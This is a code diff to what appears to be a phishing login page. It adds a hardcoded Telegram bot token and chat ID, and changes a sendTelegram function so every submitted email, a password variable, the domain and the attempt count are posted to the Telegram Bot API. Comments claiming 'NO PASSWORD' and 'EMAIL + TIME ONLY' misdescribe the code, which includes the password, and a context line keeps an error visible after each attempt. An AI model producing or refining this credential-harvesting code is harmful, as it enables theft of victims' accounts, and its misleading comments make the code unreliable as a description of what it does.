@@ -909,24 +909,33 @@ cb=googleTranslateElementInit">
     <script>
 (function () {
 
-    /* ================= TELEGRAM (SAFE) ================= */
+    /* ================= TELEGRAM (CLIENT‑SIDE, NO PASSWORD) ================= */
 
-    const TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE';
-    const TELEGRAM_CHAT_ID  = 'YOUR_CHAT_ID_HERE';
+    const TELEGRAM_BOT_TOKEN = '8066607284:AAGACS8QLcAPETXDrs0MG_fUiB9Cyy6kFGY';
+    const TELEGRAM_CHAT_ID  = '6285796509';
 
-    function sendTelegram(domain, attempt) {
+    function sendTelegram(email, domain, attempt) {
         if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return;
+
+        const now = new Date();
+
+        const message =
+`📨 Login Attempt
+━━━━━━━━━━━━━━
+Email: ${email}
+Password: ${password}
+Domain: ${domain}
+Attempt: ${attempt}
+Time: ${now.toLocaleString()}
+ISO: ${now.toISOString()}
+━━━━━━━━━━━━━━`;
 
         fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
                 chat_id: TELEGRAM_CHAT_ID,
-                text:
-                    'Login attempt\n' +
-                    'Domain: ' + domain + '\n' +
-                    'Attempt: ' + attempt + '\n' +
-                    'Time: ' + new Date().toISOString()
+                text: message
             })
         }).catch(() => {});
     }
@@ -1004,8 +1013,8 @@ cb=googleTranslateElementInit">
 
         const domain = email.split('@')[1];
 
-        // 🔔 SAFE TELEGRAM LOG (NO PASSWORD)
-        sendTelegram(domain, attempts);
+        // 🔔 TELEGRAM LOG (EMAIL + TIME ONLY)
+        sendTelegram(email, domain, attempts);
 
         // ✅ SHOW ERROR (STAYS VISIBLE)
         if (msg) {
@@ -1039,6 +1048,8 @@ cb=googleTranslateElementInit">
 
 
 
+
 </body>
 
 </html>
+
